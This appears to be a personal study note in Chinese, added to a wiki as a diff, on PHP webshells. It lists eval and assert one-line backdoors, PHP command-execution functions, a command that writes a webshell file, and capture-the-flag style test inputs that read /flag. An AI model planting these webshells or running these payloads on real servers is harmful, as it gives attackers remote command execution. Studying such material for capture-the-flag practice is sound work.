@@ -1,0 +1,40 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.6
+Creation-Date: 2024-11-22T18:17:17+08:00
+
+====== webshell ======
+Created 星期五 22 十一月 
+
+一句话木马
+
+php注入:
+eval($_POST['shell']);
+eval($_REQUEST['shell']);
+eval("eval($_POST['shell']);")  注意要有分号
+
+其他替代函数：
+assert(string):bool  用法同eval，8.0版本之前都有用
+
+如果是$_GET['shell']，需要转换成post：?shell=eval($_POST['shell']);
+
+类似函数：
+system(cmd):string|false 执行命令，输出执行结果，返回结果最后一行，失败返回false
+	system('ls')
+shell_exec(cmd): string|false|null 通过 shell 执行命令，返回完整输出
+	echo shell_exec('ls')
+撇号：`ls` 执行shell命令，返回完整输出，相当于shell_exec
+	echo `ls`
+exec(cmd, array output=null, result_code=null): string|false 执行一个外部程序，不输出结果，返回结果最后一行。当提供output参数时，会把每行输出添加到output里，返回值仍为最后一行。
+	exec('ls', $out);
+	echo $out;
+passthru(cmd, result_code=null): ?false 执行外部程序并显示原始输出，成功返回null，失败返回false
+	passthru('ls')
+
+注入webshell
+shell_exec('echo "<?php eval(\$_POST[\'shell\']); ?>" > shell.php')
+
+测试：
+shell=echo 123;
+shell=system("ls /"); -> "bin dev etc flag home lib media mnt proc root run sbin srv sys tmp usr var"
+shell=system("cat /flag");
+
